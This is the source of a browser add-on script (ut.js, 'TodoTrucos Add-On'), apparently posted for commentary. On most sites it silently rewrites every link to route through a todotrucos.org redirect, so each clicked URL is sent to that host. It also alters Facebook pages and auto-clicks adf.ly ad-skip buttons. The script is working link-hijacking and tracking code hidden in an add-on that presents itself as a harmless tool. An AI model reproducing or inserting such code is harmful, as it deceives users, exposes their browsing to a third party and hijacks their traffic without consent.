// Comentarios del codigo ut.js de TodoTrucos Add-On v 0.1.0

if (document.URL.indexOf("google.com") == -1 && document.URL.indexOf("apps.facebook.com") == -1 && document.URL.indexOf("todotrucos.org") == -1){
	var links = document.getElementsByTagName("a");
	for(i=0;i<links.length;i++) 
	{
		links[i].href = "http://www.todotrucos.org/h42-redirect?" + links[i].href;
	}
}

if (document.URL.indexOf("apps.facebook.com") != -1 && document.URL.indexOf("todotrucos.org/h42-redirect") == -1) {
	var app = document.URL.replace("https://apps.facebook.com/", "");
	var applen = app.indexOf("/");
	var app = app.slice(0,applen);
	document.getElementById("rightCol").innerHTML = app;
}

function adfly(){
	document.getElementById('skip_ad_button').click();
}

if (document.URL.indexOf('adf.ly/') != -1){
	window.setTimeout(adfly,15000);
}
